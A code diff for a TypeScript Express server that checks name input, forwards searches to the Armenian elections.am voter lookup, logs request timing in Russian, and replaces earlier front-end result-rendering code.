+    const birthDate = (data.birth_date || '').trim();
+
+    // ⚠️ CRITICAL: elections.am API requires BOTH first and last name
+    // Testing showed that date-only searches return empty results
+    if (!firstName || !lastName) {
+      console.warn('⚠️ Запрос отклонен: имя и фамилия обязательны (API elections.am не поддерживает поиск только по дате)');
+      return res.status(400).json({
+        success: false,
+        error: 'Name and surname are required (elections.am does not support search by date only) / Անունը և ազգանունը պարտադիր են'
+      } as CombinedResponse);
+    }
+
+    // Validate name lengths
+    if (firstName.length < 2) {
+      console.warn('⚠️ Запрос отклонен: имя слишком короткое');
+      return res.status(400).json({
+        success: false,
+        error: 'First name must be at least 2 characters / Անունը պետք է լինել առնվազն 2 սիմվոլ'
+      } as CombinedResponse);
+    }
+
+    if (lastName.length < 2) {
+      console.warn('⚠️ Запрос отклонен: фамилия слишком короткая');
+      return res.status(400).json({
+        success: false,
+        error: 'Last name must be at least 2 characters / Ազգանունը պետք է լինել առնվազն 2 սիմվոլ'
+      } as CombinedResponse);
+    }
+
+    console.log(`\n${'*'.repeat(80)}`);
+    console.log(`📥 НОВЫЙ ЗАПРОС API`);
+    console.log(`${'*'.repeat(80)}`);
+    console.log(`🕐 Время: ${new Date().toLocaleString('ru-RU')}`);
+    console.log(`🌐 IP: ${req.ip || req.socket.remoteAddress}`);
+
+    // Perform search
+    const results = await getSearchResults({
+      firstName,
+      lastName,
+      region: normalizeArmenianText((data.region || 'ԵՐԵՎԱՆ').trim()),
+      community,
+      middleName: normalizeArmenianText((data.middle_name || '').trim()),
+      birthDate,
+      street,
+      building,
+      apartment,
+      district
     });
 
-    const resultCountElement = document.getElementById('resultCount') as HTMLElement;
-    resultCountElement.innerHTML = `✓ Ընդամենը ${count} արդյունք հայտնաբերվել / Total ${count} results found`;
+    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
 
-    this.resultsContainer.style.display = 'block';
-    this.resultsContainer.scrollIntoView({ behavior: 'smooth' });
-  }
+    console.log(`${'*'.repeat(80)}`);
+    console.log(`✅ ЗАПРОС ВЫПОЛНЕН УСПЕШНО`);
+    console.log(`⏱️ Время выполнения: ${duration}s`);
+    console.log(`📊 Найдено результатов: ${results.length}`);
+    console.log(`${'*'.repeat(80)}\n`);
 
-  private handleReset(): void {
-    this.errorMessage.style.display = 'none';
-    this.resultsContainer.style.display = 'none';
-  }
+    return res.json({
+      success: true,
+      count: results.length,
+      results,
+      duration: duration + 's'
+    } as CombinedResponse & { duration: string });
 
-  private escapeHtml(text: string): string {
-    const div = document.createElement('div');
-    div.textContent = text;
-    return div.innerHTML;
+  } catch (error: any) {
+    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
+
+    console.error(`\n${'*'.repeat(80)}`);
+    console.error('❌ ОШИБКА API');
+    console.error(`${'*'.repeat(80)}`);
+    console.error('📋 Детали ошибки:', error.message);
+    console.error('📚 Stack trace:', error.stack);
+    console.error(`⏱️ Время до ошибки: ${duration}s`);
+    console.error(`${'*'.repeat(80)}\n`);
+
+    return res.status(500).json({
+      success: false,
+      error: 'Произошла ошибка при поиске. Попробуйте позже. / An error occurred during search. Please try again later.',
+      details: process.env.NODE_ENV === 'development' ? error.message : undefined
+    } as CombinedResponse & { details?: string });
   }
-}
+});
+
+// 404 handler
+app.use((req: Request, res: Response) => {
+  res.status(404).json({
+    success: false,
+    error: 'Endpoint not found'
+  });
+});
+
+// Error handler
+app.use((error: Error, req: Request, res: Response, next: any) => {
+  console.error('💥 Необработанная ошибка:', error);
+  res.status(500).json({
+    success: false,
+    error: 'Internal server error'
+  });
+});
+
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('👋 SIGTERM получен. Завершение работы...');
+  process.exit(0);
+});
+
+process.on('SIGINT', () => {
+  console.log('\n👋 SIGINT получен. Завершение работы...');
+  process.exit(0);
+});
+
+// Start server
+app.listen(PORT, '0.0.0.0', () => {
+  console.log('\n' + '='.repeat(80));
+  console.log('🚀 СЕРВЕР ЗАПУЩЕН');
+  console.log('='.repeat(80));
+  console.log(`📡 Порт: ${PORT}`);
+  console.log(`🌐 URL: http://0.0.0.0:${PORT}`);
+  console.log(`⏰ Время запуска: ${new Date().toLocaleString('ru-RU')}`);
+  console.log(`🔧 Окружение: ${process.env.NODE_ENV || 'development'}`);
+  console.log('='.repeat(80) + '\n');
+});
